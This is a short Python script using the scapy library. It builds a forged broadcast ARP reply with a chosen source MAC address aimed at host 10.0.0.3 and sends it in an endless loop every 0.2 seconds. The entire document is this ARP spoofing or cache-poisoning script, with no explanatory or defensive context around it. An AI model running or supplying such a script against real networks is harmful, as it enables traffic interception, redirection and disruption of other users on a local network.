from scapy.all import *

pkt = Ether(src='0c:a8:e3:7b:49:00', dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, hwsrc='0c:a8:e3:7b:49:00', pdst='10.0.0.3')

sendp(pkt, loop=1, inter=0.2)
